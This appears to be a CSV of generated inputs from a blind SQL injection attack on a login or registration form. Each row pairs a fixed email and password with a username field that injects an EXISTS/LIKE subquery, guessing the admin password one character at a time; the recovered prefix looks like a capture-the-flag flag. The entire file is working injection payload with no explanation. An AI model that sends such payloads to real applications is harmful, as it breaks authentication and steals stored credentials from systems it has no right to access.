email,username,password
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgo%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgp%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgq%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrAB%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrAC%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrAD%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrAE%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrAF%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrAG%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrAH%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrAI%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrAJ%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrAK%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrAL%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrAM%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrAN%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrAO%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrAP%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrAQ%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrAR%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrAS%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrAT %')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrAT-%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrAT*%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrAT/_%'ESCAPE '/')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrAT+%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrAT=%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrAT0%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrAT1%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrAT2%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrAT3%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrAT4%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrAT5%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrAT6%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrAT7%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrAT8%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrAT9%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrATa%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrATb%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrATc%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrATd%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrATe%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrATf%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrATg%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrATh%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrATi%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrATj%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrATk%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrATl%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrATm%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrATn%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrATo%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrATp%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrATq%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrATr%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrATs %')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrATs-%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrATs*%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrATs/_%'ESCAPE '/')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrATs+%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrATs=%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrATs0%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrATs1%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrATs2%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrATs3%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrATs4%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrATs5%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrATs6%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrATs7%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrATs8%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrATs9%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrATsA%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrATsB%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrATsC%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrATsD%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrATsE%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrATsF%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrATsG%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrATsH%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrATsI%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrATsJ%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrATsK%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrATsL%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrATsM%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrATsN%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrATsO%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrATsP%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrATsQ%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrATsR%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrATsS%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrATst%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrATsu%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrATsv%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrATsw%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrATsx%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrATsy%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrATsz%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrATU%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrATV%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrATW%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username = 'admin' and password like 'goOdinJeCTioNcoNgrATX%')#,123123
